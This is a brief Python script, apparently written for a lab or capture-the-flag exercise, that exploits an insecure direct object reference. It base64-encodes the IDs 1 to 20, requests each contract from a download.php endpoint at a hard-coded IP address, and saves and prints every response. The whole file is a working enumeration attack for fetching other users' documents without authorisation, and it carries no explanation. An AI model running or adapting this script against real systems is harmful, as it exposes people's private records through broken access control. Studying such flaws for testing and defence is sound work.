
import base64
import requests
from bs4 import BeautifulSoup
import re


def main():
    enumerate_idor('http://206.189.124.56:31114/download.php')

def enumerate_idor(url):
    
    for n in range(1,21):

        uid = encodeUID(n)
        print(uid)

        print(f'--------{n}------')
        res = requests.get(url, params={'contract':uid})
        open('contract_{}'.format(uid),'wb').write(res.content)
        with open('contract_{}'.format(uid)) as f:
            print(f.readlines())
     

def encodeUID(n):
    return base64.b64encode(str(n).encode()).decode()

if __name__ == '__main__':
    main()